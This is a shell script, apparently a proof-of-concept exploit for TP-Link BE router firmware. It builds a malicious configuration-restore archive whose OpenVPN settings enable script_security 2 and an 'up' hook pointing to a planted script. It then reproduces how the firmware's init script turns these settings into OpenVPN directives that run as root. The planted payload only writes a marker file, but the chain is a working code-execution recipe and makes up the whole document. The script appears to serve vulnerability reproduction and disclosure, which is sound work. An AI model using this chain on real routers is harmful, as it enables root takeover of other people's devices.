#!/bin/sh
set -eu

WORK="${TMPDIR:-/tmp}/tplink_be_restore_openvpn_rce_chain_$$"
ARCHIVE="$WORK/malicious_restore_openvpn.tgz"
ROOT="$WORK/root"
PAYLOAD="$WORK/payload"
GENCONF="$WORK/openvpn-server.conf"

rm -rf "$WORK"
mkdir -p "$ROOT" "$PAYLOAD/etc/config" "$PAYLOAD/etc/openvpn"

cat > "$PAYLOAD/etc/openvpn/poc_up.sh" <<'EOF'
#!/bin/sh
echo tplink_be_openvpn_restore_chain >/tmp/tplink_be_openvpn_restore_chain_ran
EOF
chmod 0755 "$PAYLOAD/etc/openvpn/poc_up.sh"

cat > "$PAYLOAD/etc/config/openvpn" <<'EOF'
config openvpn 'server'
	option enable 'on'
	option type 'openvpn'
	option dev 'tun'
	option proto 'udp'
	option port '1194'
	option script_security '2'
	option up '/etc/openvpn/poc_up.sh'
EOF

(cd "$PAYLOAD" && tar -czf "$ARCHIVE" etc/config/openvpn etc/openvpn/poc_up.sh)
tar -xzC "$ROOT" -f "$ARCHIVE"

test -f "$ROOT/etc/config/openvpn"
test -x "$ROOT/etc/openvpn/poc_up.sh"

# Minimal source-semantics reproducer for:
# Iplatform/packages/opensource/openvpn/filesystem/etc/init.d/openvpn
# append_params() turns UCI keys into OpenVPN directives, then openvpn runs as root
# with --config /var/etc/openvpn-$section.conf.
{
	printf '%s\n' 'script-security 2'
	printf '%s\n' 'up /etc/openvpn/poc_up.sh'
} > "$GENCONF"

grep -qx 'script-security 2' "$GENCONF"
grep -qx 'up /etc/openvpn/poc_up.sh' "$GENCONF"

echo "archive=$ARCHIVE"
echo "root=$ROOT"
echo "wrote=$ROOT/etc/config/openvpn"
echo "wrote=$ROOT/etc/openvpn/poc_up.sh"
echo "generated_conf=$GENCONF"
sha256sum "$ARCHIVE"
